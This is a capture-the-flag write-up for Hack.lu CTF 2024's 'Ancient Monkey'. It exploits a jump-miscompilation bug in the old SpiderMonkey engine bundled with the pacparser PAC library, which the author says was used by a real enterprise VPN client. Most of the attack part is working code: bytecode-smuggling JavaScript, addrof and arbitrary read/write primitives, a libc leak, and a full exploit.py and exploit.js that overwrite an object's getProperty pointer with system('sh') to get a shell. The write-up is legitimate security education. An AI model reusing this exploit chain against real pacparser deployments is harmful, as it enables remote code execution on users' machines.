---
title: "Ancient Monkey - Hack.lu CTF 2024"
category: "rev"
type: "writeup"
tags: ["rev", "ancient", "monkey", "hack-lu-ctf", "hack-lu-ctf-2024", "2024", "ctf-writeup"]
summary: "Last year, @swapgs and I found a fun bug in the popular enterprise VPN solution Zscaler."
source:
  name: "CTFtime writeup #39607"
  url: "https://ctftime.org/writeup/39607"
original_source: "https://blog.pspaul.de/posts/ancient-monkey-pwning-a-17-year-old-version-of-spidermonkey/"
ctf:
  name: "Hack.lu CTF 2024"
  year: 2024
  challenge: "Ancient Monkey"
---

## Metadata

- **CTF:** Hack.lu CTF 2024
- **Task:** Ancient Monkey
- **Author team:** FluxFingers
- **CTFtime:** <https://ctftime.org/writeup/39607>
- **Original writeup:** <https://blog.pspaul.de/posts/ancient-monkey-pwning-a-17-year-old-version-of-spidermonkey/>

---
![Hero image](https://blog.pspaul.de/posts/ancient-monkey-pwning-a-17-year-old-version-of-spidermonkey/hero.png)

Last year, [@swapgs](https://infosec.exchange/@swapgs) and I found a fun bug in the popular enterprise VPN solution [Zscaler](https://www.zscaler.com/de/products-and-solutions/zscaler-client-connector). The VPN client was using the [pacparser](https://github.com/manugarg/pacparser) library to decide which HTTP requests should be proxied. The decision was made based on a pre-configured [Proxy Auto-Configuration (PAC)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_PAC_file) file which contains JavaScript code.

[The bug](https://github.com/manugarg/pacparser/security/advisories/GHSA-62q6-v997-f7v9) allowed us to escape from a string and execute arbitrary JavaScript in the context of the PAC file. We noticed that pacparser was using a [17 year old version of SpiderMonkey](https://github.com/manugarg/pacparser/tree/c4ac28b6c621b8c94f9db40e77e2ea7aee707933/src/spidermonkey) (Firefox's JS engine), but we didn't have the chance to develop a full exploit at the time. Instead, we just reported the vulnerability, suggesting that code execution is likely possible.

Fast forward to this year. When preparing Hack.lu CTF 2024, I noticed we were low on pwn challenges, so I decided to dust off my pwning skills (I'm usually a web player) and give this bug a try!

## A Promising SpiderMonkey Bug

I started by searching the Mozilla bugtracker for a suitable bug. I found a few that were working in pacparser's version of SpiderMonkey, including one that sounded quite interesting:

[398085 - Crash with large switch statement [@ js_Interpret]VERIFIED (igor) in Core - JavaScript Engine. Last updated 2012-01-23.](https://bugzilla.mozilla.org/show_bug.cgi?id=398085)

When reading through the comments, [this one](https://bugzilla.mozilla.org/show_bug.cgi?id=398085#c17) sums up the bug pretty well:

> Switch statements in large functions is quite broken. In this testcase the switch can't be reached but its mere presence causes the emitter to generate the wrong bytecode for the 'if' statement. It should be 'ifeqx 32804', but it is 'ifeq 14' instead.
> 
> With this trick an attacker could get the engine to execute arbitrary bytecodes so this might be security sensitive?

When a function's total bytecode is too long, jumps get messed up. The following code will cause the first `if` to make a short jump (11 bytes) instead of jumping to the end of the block:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
```

| 

```
    function trigger(a) {  
      var foo;  
      var bar;  
      if (a) {  
        foo = (1);  
        bar = 0x414141;  
      
        // Next line requires 48 bytes:  
        // 8 * getargprop (5 bytes) + 7 add (1 byte) + 1 pop (1 byte)  
        a.x + a.x + a.x + a.x + a.x + a.x + a.x + a.x;  
        a.x + a.x + a.x + a.x + a.x + a.x + a.x + a.x;  
        a.x + a.x + a.x + a.x + a.x + a.x + a.x + a.x;  
        // ... repeat this line 680 more times (= 32784 bytes) ...  
      }  
      
      return "Everything's fine."  
      // Comment out the switch statement and the bug disappears.  
      switch (a) {  
        case 1: ;  
        case 2: return;  
      }  
    }  
      
    trigger(false);  
```  
  
---|---  
  
Such a misaligned jump can be used to execute arbitrary bytecode by jumping into the literal portion of a `UINT24` instruction:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
```

| 

```
    0000: 56 00 00      GETVAR 0          ; var foo  
    0003: 51            POP               ;   
    0004: 56 00 01      GETVAR 1          ; var bar  
    0007: 51            POP               ;   
    0008: 54 00 00      GETARG 0          ;   
    000b: 07 00 0b      IFEQ 0xb          ; if (a) {  
    000e: 00            NOP               ;  
    000f: 3f            ONE               ;  
    0010: 83            GROUP             ;  
    0011: 57 00 00      SETVAR 0          ; foo = (1)  
    0014: 51            POP               ;  
    0015: bc 41 41 41   UINT24 0x414141   ;  
    0019: 57 00 01      SETVAR 1          ; bar = 0x414141  
    001c: 51            POP               ;  
    ; ...  
```  
  
---|---  
  
The `IFEQ` jump at `0000b` will jump `0xb` (11) bytes, landing at `0016`. Since the `UINT24` instruction starts at `0015`, this is a misaligned jump. SpiderMonkey will then try to run the next byte (`0x41`), which corresponds to the `THIS` instruction.

With this, we can execute arbitrary byte code but we're limited to 3 bytes. Most instructions are either 1 or 3 bytes long. We can run longer sequences of 1-byte instructions by using the first 2 bytes for instructions and setting the last byte to the `IFEQ` or `IFNE` opcodes. Since `IFEQ` and `IFNE` are 3-byte instructions, they will consume the 2 bytes after.

When writing JavaScript like `0x000007,0x000007,0x000007`, the resulting bytecode assembly looks like this:

```
    1  
    2  
    3  
    4  
    5  
    6  
```

| 

```
    0000: bc 00 00 07   UINT24 0x000007  
    0004: 51            POP  
    0005: bc 00 00 07   UINT24 0x000007  
    0009: 51            POP  
    000a: bc 00 00 07   UINT24 0x000007  
    000e: 51            POP  
```  
  
---|---  
  
However, when using the misaligned jump, the following VM instructions are executed:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
```

| 

```
    0000: bc                       ; ignored due to misaligned jump  
    0001: 00         NOP           ; execution starts here  
    0002: 00         NOP  
    0003: 07 51 bc   IFEQ 0x51bc   ; not taken  
    0006: 00         NOP  
    0007: 00         NOP  
    0008: 07 51 bc   IFEQ 0x51bc   ; not taken  
    000b: 00         NOP  
    000c: 00         NOP  
    000d: 07 51 bc   ; ...  
```  
  
---|---  
  
By cleverly selecting `IFEQ` or `IFNE` so that the branch is never taken, we can succesfully skip the `51 bc` bytes from the original `POP` and `UINT24` instructions. Instead of `NOP`s, we can use arbitrary 1-byte instructions, making a very long chain if necessary.

## Memory Corruption

Arbitrary bytecode execution is cool and all, but to do anything meaningful we want to corrupt some memory. For this, I had to look around a bit and see which instructions do interesting stuff.

After a while, I realized that `POP`/`POP2` might be just what I was looking for. They decrement the VM's stack pointer and do not check if they underflow the stack:

jsinterp.c[source](https://github.com/manugarg/pacparser/blob/c4ac28b6c621b8c94f9db40e77e2ea7aee707933/src/spidermonkey/js/src/jsinterp.c#L2349-L2355)

```
    2349  
    2350  
    2351  
    2352  
    2353  
    2354  
    2355  
```

| 

```
    BEGIN_CASE(JSOP_POP)  
      sp--;  
    END_CASE(JSOP_POP)  
      
    BEGIN_CASE(JSOP_POP2)  
      sp -= 2;  
    END_CASE(JSOP_POP2)  
```  
  
---|---  
  
When inspecting the memory around `sp`, I noticed that the stack frame object lives directly beneath. It contains some interesting things, including a lot of pointers:

jsinterp.h[source](https://github.com/manugarg/pacparser/blob/c4ac28b6c621b8c94f9db40e77e2ea7aee707933/src/spidermonkey/js/src/jsinterp.h#L60-L84)

```
    60  
    61  
    62  
    63  
    64  
    65  
    66  
    67  
    68  
    69  
    70  
    71  
    72  
    73  
    74  
    75  
    76  
    77  
    78  
    79  
    80  
    81  
    82  
    83  
    84  
```

| 

```
    struct JSStackFrame {  
      JSObject        *callobj;       /* lazily created Call object */  
      JSObject        *argsobj;       /* lazily created arguments object */  
      JSObject        *varobj;        /* variables object, where vars go */  
      JSScript        *script;        /* script being interpreted */  
      JSFunction      *fun;           /* function being called or null */  
      JSObject        *thisp;         /* "this" pointer if in method */  
      uintN           argc;           /* actual argument count */  
      jsval           *argv;          /* base of argument stack slots */  
      jsval           rval;           /* function return value */  
      uintN           nvars;          /* local variable count */  
      jsval           *vars;          /* base of variable stack slots */  
      JSStackFrame    *down;          /* previous frame */  
      void            *annotation;    /* used by Java security */  
      JSObject        *scopeChain;    /* scope chain */  
      jsbytecode      *pc;            /* program counter */  
      jsval           *sp;            /* stack pointer */  
      jsval           *spbase;        /* operand stack base */  
      uintN           sharpDepth;     /* array/object initializer depth */  
      JSObject        *sharpArray;    /* scope for #n= initializer vars */  
      uint32          flags;          /* frame flags -- see below */  
      JSStackFrame    *dormantNext;   /* next dormant frame chain */  
      JSObject        *xmlNamespace;  /* null or default xml namespace in E4X */  
      JSObject        *blockChain;    /* active compile-time block scopes */  
    };  
```  
  
---|---  
  
By chaining a bunch of `POP2`s, we can make the stack pointer point to `&fp->argv`. Next time we push something to the stack, we will overwrite `fp->argv`. We can then read from and write to `fp->argv` using the `GETARG` and `SETARG` instructions:

jsinterp.c[source](https://github.com/manugarg/pacparser/blob/c4ac28b6c621b8c94f9db40e77e2ea7aee707933/src/spidermonkey/js/src/jsinterp.c#L4599-L4613)

```
    4599  
    4600  
    4601  
    4602  
    4603  
    4604  
    4605  
    4606  
    4607  
    4608  
```

| 

```
    BEGIN_CASE(JSOP_GETARG)  
      slot = GET_ARGNO(pc);  
      PUSH_OPND(fp->argv[slot]);  
    END_CASE(JSOP_GETARG)  
      
    BEGIN_CASE(JSOP_SETARG)  
      slot = GET_ARGNO(pc);  
      vp = &fp->argv[slot];  
      *vp = FETCH_OPND(-1);  
    END_CASE(JSOP_SETARG)  
```  
  
---|---  
  
We can control `slot` for these instructions, which is a `uint16_t` read from the bytecode. This means that we can now read `ptr[slot]` and write `ptr[slot] = val`. The only problem is that the stack frame gets corrupted along the way, crashing the VM when returning from the current function. I didn't investigate why exactly this happens or if I could prevent it. Instead, I just started calling a callback function instead of returning:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
```

| 

```
    function pwn(a, cb) {  
      var foo, bar;  
      if (a) {  
        foo = (1);  
        bar = 0x6b6b07,0x6b6b07,0x6b6b07,0x6b6b07,0x6b6b07; // point sp to &fp->argv  
        cb(a); // call cb with the value of fp->argv[0]  
      
        // ...  
      }  
      // ...  
    }  
```  
  
---|---  
  
## Building an `addrof` Primitive

In this SpiderMonkey version, JavaScript values can be one of multiple types. The value is tagged with a type-specific masked to allow the VM to know the type before using the value. These are the possible types with their masks:

Type | Mask  
---|---  
`JSObject*` | `0b000`  
`int` | `0b001`  
`double*` | `0b010`  
`JSString*` | `0b100`  
`bool` | `0b110`  
  
As an example, when the value is an object, it will be the raw pointer to the object (`obj_ptr & 0b000`). When the value is an integer, it will be stored as `(int_val << 1) | 1`. When the value is a double or a string, it is a pointer masked with the corresponding mask value.

To convert a raw pointer to a value that can be handled in the JavaScript world, we need to either turn it into an int or a double, or somehow write it into the char array of a string. Ints don't fit well because we can't just set the least significant bit to 1. Strings are also inconvenient because we would have to remove the pointer mask to get the char array pointer.

Doubles can be more helpful for us, which becomes clear when we look at them in memory. A value like `0x55d9ab4b8c62` is identified as a double since it has a `2` as the least significant hex digit. To access the value, the VM would remove the mask, resulting in `0x55d9ab4b8c60`, and read the 8 bytes at that address. The bytes `3d0ad7a370bd2a40` correspond to the IEEE-754 floating point encoding of `13.37`:

```
    0x55d9ab4b8c60:  3d 0a d7 a3  70 bd 2a 40   00 00 00 00  00 00 00 00
    0x55d9ab4b8c70:  40 00 00 00  00 00 00 c0   80 8c 4b ab  d9 55 00 00
```

However, with our pointer write primitive, we can only write to the double pointer _without removing the tag_ (`0x55d9ab4b8c62`). This would result in accessing the following memory:

```
    0x55d9ab4b8c60:  3d 0a d7 a3  70 bd 2a 40   00 00 00 00  00 00 00 00
    0x55d9ab4b8c70:  40 00 00 00  00 00 00 c0   80 8c 4b ab  d9 55 00 00
```

Doing such a misaligned write would only overwrite the upper 6 bytes of the double value and "lose" the upper 2 bytes of the value being written since it's written outside of the double value. Pointers are 8 bytes on 64-bit machines, but they actually only hold 48 bits of information, which is 6 bytes.

This nice coincidence allows us to write a pointer to the misaligned (tagged) double pointer and still have all the relevant bits inside the double value! Writing a pointer of `0x0000414141414141` to a double would look like this:

```
    0x55d9ab4b8c60:  3d 0a 41 41  41 41 41 41   00 00 00 00  00 00 00 00
    0x55d9ab4b8c70:  40 00 00 00  00 00 00 c0   80 8c 4b ab  d9 55 00 00
```

Back in the JavaScript world, we can read the double and manually convert it to its byte representation, resulting in `3d0a414141414141`. By removing the first 2 bytes and converting from little-endian, we get the original pointer of `0x414141414141`. Therefore, our `addrof` primitive can implemented like this:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
```

| 

```
    function addrof(a, double, ptr, cb) {  
      var foo, bar;  
      var _double = double;  
      var _ptr = ptr;  
      if (a) {  
        foo = (1);  
        bar = 0x6b6b07,0x6b6b07,0x6b6b07,0x6b6b07,0x6b6b07; // point sp to &fp->argv  
        b + (          // overwrite fp->argv with the double pointer  
          (a = _ptr),  // write the pointer to *double (misaligned)  
          cb(_double)  // call cb with the double pointer  
        )  
        // ...  
      }  
      // ...  
    }  
```  
  
---|---  
  
The callback then has to convert the double to its byte representation, for example using [this JS IEEE-754 implementation](https://gist.github.com/Manouchehri/f4b41c8272db2d6423fa987e844dd9ac).

## Leaking Interesting Stuff

From now on, we just have to do the regular pwn workâ¢. First, we leak the base address of the binary in memory by reading a function pointer. This quite easy with our pointer deref primitive and `addrof`. All JS objects contain a struct of function pointers in `obj->map->ops`:

![JSObject structure](https://blog.pspaul.de/posts/ancient-monkey-pwning-a-17-year-old-version-of-spidermonkey/jsobj.svg)

By reading the `lookupProperty` function pointer of a regular JS object, we get the address of the `js_LookupProperty` function inside the binary. From there, we can calculate the base address by subtracting the function's offset.

To get the libc base address, we can read one of the global offset table (GOT) entries. All of them are resolved because full RelRO is enabled on the binary. From there we can calculate the address of the `system()` function which we'll use to get a shell later.

## Getting a Shell

To hijack the control flow, we can overwrite and call a function pointer. The `ops` pointers of JS objects are good candidates for this, but the problem is that we don't fully control the call arguments. Looking at the actual functions, we can see that all of them expect a context pointer as their first argument:

```
    1  
    2  
    3  
    4  
```

| 

```
    JS_HasProperty(JSContext *cx, JSObject *obj, const char *name, JSBool *foundp);  
    JS_LookupProperty(JSContext *cx, JSObject *obj, const char *name, jsval *vp);  
    JS_GetProperty(JSContext *cx, JSObject *obj, const char *name, jsval *vp);  
    // ...  
```  
  
---|---  
  
Lucky for us, the context object is the same during the runtime of binary and it is stored in the binary's `.bss` section:

```
    0013e1b0  uint64_t myip = 0x0
    0013e1b8  uint64_t rt = 0x0
    0013e1c0  uint64_t cx = 0x0
    0013e1c8  uint64_t global = 0x0
    0013e1d0  uint32_t didFirstChecks.0 = 0x0
```

The object itself lives on the heap, so we can leak its address and write to its location to control what the first argument passed to the `ops` functions points to. To get a shell, we will overwrite the `getProperty()` function pointer with `system()` and write our shell command to `*cx`.

To write arbitrary data, we could use a double value like before, but we can go for a simpler way here. Since ints are shifted and masked with `1`, we can use it to create a short byte sequence that has the LSB of the first byte set.

For a shell, we can write `"sh\x00"` as the value, which is `736800` in raw bytes, or `0x6873` as a little-endian integer. To accomodate for the value tagging, we have to use the right-shifted value in the JS world (`0x3439`). In memory, the value will again be our desired byte sequence due to the value tagging (`73680000`).

With everything in place, we can get our shell by simply accessing `obj.x`. This JS expression will cause the `x` property of `obj` to be retrieved via `obj->map->ops->getProperty(cx, ...)`. Since the `getProperty` operation was overwritten with libc's `system()` and `cx` now points to `"sh\x00"`, this is equivalent to calling `system("sh")` and gives us a shell!

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
```

| 

```
    [*] './pactester'  
        Arch:       amd64-64-little  
        RELRO:      Full RELRO  
        Stack:      Canary found  
        NX:         NX enabled  
        PIE:        PIE enabled  
        SHSTK:      Enabled  
        IBT:        Enabled  
        Stripped:   No  
        Debuginfo:  Yes  
    [*] './libc.so.6'  
        Arch:       amd64-64-little  
        RELRO:      Full RELRO  
        Stack:      Canary found  
        NX:         NX enabled  
        PIE:        PIE enabled  
        FORTIFY:    Enabled  
        SHSTK:      Enabled  
        IBT:        Enabled  
    chal.lookupProperty: 0x9a85a  
    chal.cx:             0x13e1c0  
    chal.getenv@got.plt: 0x137ee0  
    libc.getenv:         0x487a0  
    libc.system:         0x58740  
    [+] Opening connection to monke.flu.xxx on port 1337: Done  
    [*] Switching to interactive mode  
    $ id  
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)  
    $ /readflag  
    flag{no_jit_no_wasm_no_worries}  
```  
  
---|---  
  
## Summary

All of this took me roughly one week to figure out, during which I learned a ton! I attributed most of this time to me not being a regular pwner, but maybe I overestimated how much time can be saved with experience. After the CTF, I realized that I probably should have given more hints to the players because the challenge was only solved once, and the player used different bugs.

If I would create the challenge again, I would give the bug ticket as a hint so people don't have to find it themselves and can focus on pwning instead. I think the challenge would have been more approachable that way, since the bug allows executing arbitrary bytecode, giving players much more to play around with.

Anyways, I hope you enjoyed this writeup, maybe you also learned a thing or two. It's interesting how some missing mitigations made exploitation easier (e.g., no constant blinding) while some missing features made it less convenient (e.g., no WASM `rwx` pages). Maybe I have to create another challenge for next year to have an excuse for learning modern JS engine pwning?

## Final Exploit

`exploit.py` exploit.py

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
```

| 

```
    import re  
    from pwn import *  
      
    pactester = ELF('./pactester')  
    libc = ELF('./libc.so.6')  
      
    # get offsets  
    lookup_property = hex(pactester.symbols['js_LookupProperty'] - pactester.address)  
    cx = hex(pactester.symbols['cx'] - pactester.address)  
    getenv_got_plt = hex(pactester.got['getenv'] - pactester.address)  
    libc_getenv = hex(libc.symbols['getenv'])  
    libc_system = hex(libc.symbols['system'])  
      
    print('chal.lookupProperty:', lookup_property)  
    print('chal.cx:            ', cx)  
    print('chal.getenv@got.plt:', getenv_got_plt)  
    print('libc.getenv:        ', libc_getenv)  
    print('libc.system:        ', libc_system)  
      
    with open('./exploit.js', 'r') as f:  
        js = f.read()  
      
    # replace offsets  
    js = re.sub('(var OFFSET_LOOKUP_PROPERTY =) 0x[a-f0-9]+(;)', r'\1 ' + lookup_property + r'\2', js)  
    js = re.sub('(var OFFSET_CX              =) 0x[a-f0-9]+(;)', r'\1 ' + cx + r'\2', js)  
    js = re.sub('(var OFFSET_GETENV_GOT      =) 0x[a-f0-9]+(;)', r'\1 ' + getenv_got_plt + r'\2', js)  
    js = re.sub('(var OFFSET_GETENV          =) 0x[a-f0-9]+(;)', r'\1 ' + libc_getenv + r'\2', js)  
    js = re.sub('(var OFFSET_SYSTEM          =) 0x[a-f0-9]+(;)', r'\1 ' + libc_system + r'\2', js)  
      
    # minify JS  
    js = re.sub(r'^\s+', '', js)  
    js = re.sub(r'(\W)\s+(\w)', r'\1\2', js)  
    js = re.sub(r'(\w)\s+(\W)', r'\1\2', js)  
    js = re.sub(r'(\W)\s+(\W)', r'\1\2', js)  
    js = re.sub(r'(\W)\s+(\W)', r'\1\2', js)  
    js = js.replace("'", '"')  
    js = js.replace(';}', '}')  
    js = js.strip().rstrip(';')  
      
    url = '://);function findProxyForURL(s){return eval(s.slice(63))}<!--/' + js + '//\\'  
      
    host = args.HOST or 'localhost'  
    r = remote(host, 1337)  
    r.sendlineafter(b': ', url.encode())  
    r.interactive()  
```  
  
---|---  
`exploit.js` exploit.js

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
    46  
    47  
    48  
    49  
    50  
    51  
    52  
    53  
    54  
    55  
    56  
    57  
    58  
    59  
    60  
    61  
    62  
    63  
    64  
    65  
    66  
    67  
    68  
    69  
    70  
    71  
    72  
    73  
    74  
    75  
    76  
    77  
    78  
    79  
    80  
    81  
    82  
    83  
    84  
    85  
    86  
    87  
    88  
    89  
    90  
    91  
    92  
    93  
    94  
    95  
    96  
    97  
    98  
    99  
    100  
    101  
    102  
    103  
    104  
    105  
    106  
    107  
    108  
    109  
    110  
    111  
    112  
    113  
    114  
    115  
    116  
    117  
    118  
    119  
    120  
    121  
    122  
    123  
    124  
    125  
    126  
    127  
    128  
    129  
    130  
    131  
    132  
    133  
    134  
    135  
    136  
    137  
    138  
    139  
    140  
    141  
    142  
    143  
    144  
    145  
    146  
    147  
    148  
    149  
    150  
    151  
    152  
    153  
    154  
    155  
    156  
    157  
    158  
    159  
    160  
    161  
    162  
    163  
    164  
    165  
    166  
    167  
    168  
    169  
    170  
    171  
    172  
    173  
    174  
    175  
    176  
    177  
    178  
    179  
    180  
    181  
    182  
    183  
    184  
    185  
    186  
    187  
    188  
    189  
    190  
    191  
    192  
    193  
    194  
    195  
    196  
    197  
    198  
    199  
    200  
    201  
    202  
    203  
    204  
    205  
    206  
    207  
    208  
    209  
    210  
```

| 

```
    function toIEEE754(v, ebits, fbits) {  
        var bias = (1 << (ebits - 1)) - 1;  
        var s, e, f;  
        if (isNaN(v)) {  
            e = (1 << bias) - 1; f = 1; s = 0;  
        } else if (v === Infinity || v === -Infinity) {  
            e = (1 << bias) - 1; f = 0; s = (v < 0) ? 1 : 0;  
        } else if (v === 0) {  
            e = 0; f = 0; s = (1 / v === -Infinity) ? 1 : 0;  
        } else {  
            s = v < 0;  
            v = Math.abs(v);  
            if (v >= Math.pow(2, 1 - bias)) {  
                var ln = Math.min(Math.floor(Math.log(v) / Math.LN2), bias);  
                e = ln + bias;  
                f = v * Math.pow(2, fbits - ln) - Math.pow(2, fbits);  
            } else {  
                e = 0;  
                f = v / Math.pow(2, 1 - bias - fbits);  
            }  
        }  
      
        var i, bits = [];  
        for (i = fbits; i; i -= 1) { bits.push(f % 2 ? 1 : 0); f = Math.floor(f / 2); }  
        for (i = ebits; i; i -= 1) { bits.push(e % 2 ? 1 : 0); e = Math.floor(e / 2); }  
        bits.push(s ? 1 : 0);  
        bits.reverse();  
        var str = bits.join('');  
      
        var bytes = [];  
        while (str.length) {  
            bytes.push(parseInt(str.substring(0, 8), 2));  
            str = str.substring(8);  
        }  
        return bytes;  
    }  
      
    function fromIEEE754(bytes, ebits, fbits) {  
        var bits = [];  
        for (var i = bytes.length; i; i -= 1) {  
            var byte = bytes[i - 1];  
            for (var j = 8; j; j -= 1) {  
                bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;  
            }  
        }  
        bits.reverse();  
        var str = bits.join('');  
      
        var bias = (1 << (ebits - 1)) - 1;  
        var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;  
        var e = parseInt(str.substring(1, 1 + ebits), 2);  
        var f = parseInt(str.substring(1 + ebits), 2);  
      
        if (e === (1 << ebits) - 1) {  
            return f !== 0 ? NaN : s * Infinity;  
        } else if (e > 0) {  
            return s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));  
        } else if (f !== 0) {  
            return s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));  
        } else {  
            return s * 0;  
        }  
    }  
      
    function fromIEEE754Double(b) { return fromIEEE754(b, 11, 52); }  
    function   toIEEE754Double(v) { return   toIEEE754(v, 11, 52); }  
      
    function toIEEE754DoubleString(v) {  
        return toIEEE754Double(v)  
                .map(function(n){ var h = n.toString(16); return h.length == 1 ? '0' + h : h })  
                .join('')  
    }  
      
    function fromIEEE754DoubleString(s) {  
        s = s.substring(4, 16) + '0000';  
        var bytes = s.match(/../g).map(function(n){ return parseInt(n, 16) });  
        return fromIEEE754Double(bytes);  
    }  
      
    var BIG = '';  
    for (var i = 0; i < 600; i++) BIG += 'a.x+a.x+a.x+a.x+a.x+a.x+a.x+a.x;';  
      
    function runBytecode(instr, prologue, epilogue) {  
        prologue = prologue || '';  
        epilogue = epilogue || '';  
        return Function('a', 'b', 'c', 'd', 'e', ''  
            + 'var _,__,foo;'  
            + prologue + ';'  
            + 'if(c){'  
            +   'do{'  
            +     '__=(1);'  
            +     '_='+instr+';'  
            +   '}while(foo);'  
            +   'return;'  
            +   BIG  
            + '}'  
            + 'return _;'  
            + 'switch(a){'  
            +   'case 1:'  
            +   'case 2:return'  
            + '}'  
            + 'return 0;'  
            + epilogue  
        );  
    }  
      
    function pop(n, jumps) {  
        var lits = [];  
        while (n>0) {  
            if (n > 5) {  
                literal = '0x6b6b' + (jumps[lits.length]?'07':'08');  
                n -= 5;  
            } else if (n == 5) {  
                literal = '0x6b6b00';  
                n -= 5;  
            } else {  
                literal = '0x' + [,'000000','510000','515100','515151'][n];  
                n -= n;  
            }  
            lits.push(literal);  
        }  
        return '('+lits.join(',')+')';  
    }  
      
    function leakFuncPtr() {  
        var getOpsPtr = runBytecode(pop(25,[0,0,1,0,1,1]) + ';var foo=b;foo=a;foo=b;foo=c;return foo');  
        return getOpsPtr(123, {}, 0);  
    }  
      
    function doubleToHex(double) {  
        return padStart(toIEEE754DoubleString(double).substring(0, 12), 16, '0');  
    }  
      
    function addrof(val, cb) {  
        var writeToDouble = runBytecode(pop(29,[1,1,0,1,1,1]) + ';b+((a=__),cb(saved))', '__=a;var saved=b,cb=d');  
        var double = 156842099844.51764;  
        writeToDouble(val, double, 0, function(double){  
            cb(doubleToHex(double));  
        });  
    }  
      
    var writeWhatWhereFunc = runBytecode(pop(29,[1,1,0,1,1,1]) + ';b+((a=__),cb(saved))', '__=a;var saved=b,cb=d');  
    function write(what, where, cb) {  
        writeWhatWhereFunc(what, where, 0, cb);  
    }  
      
    function writeObjOpsPtr(obj, ptr, cb) {  
        var writePtr = runBytecode(pop(29,[1,1,0,1,1,1]) + ';foo=b;foo=a;foo=b+((e=saved)+cb())', 'var saved=a,cb=d;');  
        writePtr(ptr, obj, 0, cb);  
    }  
      
    var derefFunc = runBytecode(pop(29,[1,1,0,1,1,1]) + ';b+cb(a)', '__=a;var saved=b,cb=d');  
    function deref(doublePtr, cb) {  
        derefFunc(null, doublePtr, 0, cb);  
    }  
      
    function rawPtr(hex, cb) {  
        var double = fromIEEE754DoubleString(hex);  
        deref(double, cb);  
    }  
      
    function readPtr(addrHex, cb) {  
        rawPtr(addrHex, function(ptr) {  
            deref(ptr, function(val) {  
                addrof(val, cb);  
            });  
        });  
    }  
      
    function padStart(s, n, c) {  
        var res = '';  
        while (res.length < n - s.length) res += c;  
        return res + s;  
    }  
    function hexPtrAdd(h, n) {  
        var hi = parseInt(h.substring(0, h.length-8), 16);  
        var lo = parseInt(h.substring(h.length-8, h.length), 16);  
        lo += n;  
        return padStart(hi.toString(16), 8, '0') + padStart(lo.toString(16), 8, '0');  
    }  
      
    var OFFSET_LOOKUP_PROPERTY = 0x9a85a;  
    var OFFSET_CX              = 0x13e1c0;  
    var OFFSET_GETENV_GOT      = 0x137ee0;  
    var OFFSET_GETENV          = 0x487a0;  
    var OFFSET_SYSTEM          = 0x58740;  
      
    var leakme = leakFuncPtr();  
    addrof(leakme, function(addr) {  
        var base = hexPtrAdd(addr, -OFFSET_LOOKUP_PROPERTY);  
        var cxBss = hexPtrAdd(base, OFFSET_CX);  
        readPtr(cxBss, function(cx) {  
            var getenvGot = hexPtrAdd(base, OFFSET_GETENV_GOT);  
            readPtr(getenvGot, function(getenv) {  
                var libc = hexPtrAdd(getenv, -OFFSET_GETENV);  
                var system = hexPtrAdd(libc, OFFSET_SYSTEM);  
                rawPtr(cx, function(cxPtr) {  
                    var cmd = 0x006873 >>> 1;  
                    write(cmd, cxPtr, function(){  
                        rawPtr(system, function(systemPtr) {  
                            var pwnMe = {};  
                            writeObjOpsPtr(pwnMe, systemPtr, function() {  
                                pwnMe.x;  
                            });  
                        });  
                    });  
                });  
            });  
        });  
    });  
```  
  
---|---
